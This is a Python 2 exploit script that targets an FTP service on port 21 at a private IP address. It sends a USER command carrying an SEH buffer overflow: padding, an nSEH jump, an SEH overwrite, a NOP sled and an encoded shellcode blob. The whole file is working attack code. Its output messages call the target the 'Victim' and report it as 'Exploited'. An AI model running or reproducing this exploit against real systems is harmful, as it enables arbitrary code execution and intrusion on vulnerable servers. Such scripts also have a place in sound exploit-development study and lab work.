#!/usr/bin/python2

import socket
import sys

host = "192.168.70.139"
port = 21

crash = "A" * 600
nseh = "\x90\x90\xeb\x07"
seh = "\xd7\xfc\x01\x10"
nops_sled = "\x90" * 20
shellcode = (
"\xda\xd0\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x31\xbf\x4a\x24"
"\xf2\x34\x31\x7a\x18\x83\xc2\x04\x03\x7a\x5e\xc6\x07\xc8"
"\xb6\x84\xe8\x31\x46\xe9\x61\xd4\x77\x29\x15\x9c\x27\x99"
"\x5d\xf0\xcb\x52\x33\xe1\x58\x16\x9c\x06\xe9\x9d\xfa\x29"
"\xea\x8e\x3f\x2b\x68\xcd\x13\x8b\x51\x1e\x66\xca\x96\x43"
"\x8b\x9e\x4f\x0f\x3e\x0f\xe4\x45\x83\xa4\xb6\x48\x83\x59"
"\x0e\x6a\xa2\xcf\x05\x35\x64\xf1\xca\x4d\x2d\xe9\x0f\x6b"
"\xe7\x82\xfb\x07\xf6\x42\x32\xe7\x55\xab\xfb\x1a\xa7\xeb"
"\x3b\xc5\xd2\x05\x38\x78\xe5\xd1\x43\xa6\x60\xc2\xe3\x2d"
"\xd2\x2e\x12\xe1\x85\xa5\x18\x4e\xc1\xe2\x3c\x51\x06\x99"
"\x38\xda\xa9\x4e\xc9\x98\x8d\x4a\x92\x7b\xaf\xcb\x7e\x2d"
"\xd0\x0c\x21\x92\x74\x46\xcf\xc7\x04\x05\x85\x16\x9a\x33"
"\xeb\x19\xa4\x3b\x5b\x72\x95\xb0\x34\x05\x2a\x13\x71\xf7"
"\xdb\xae\x6f\x60\x42\x5b\xd2\xec\x75\xb1\x10\x09\xf6\x30"
"\xe8\xee\xe6\x30\xed\xab\xa0\xa9\x9f\xa4\x44\xce\x0c\xc4"
"\x4c\xad\xd3\x56\x0c\x1c\x76\xdf\xb7\x60"
) 
padding = "B" * 2000

payload = crash + nseh + seh + nops_sled + shellcode + padding 

buffer = "USER " + payload + "\r\n"
buffer += "PASS pero\r\n"

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host, port))
	s.recv(1024)
	s.send(buffer)
	print("Payloads Sent Successfully!")
	print("Exploited.")
	s.close()
except:
	print("Victim is Unreachable, Better Luck next time!")
	sys.exit()
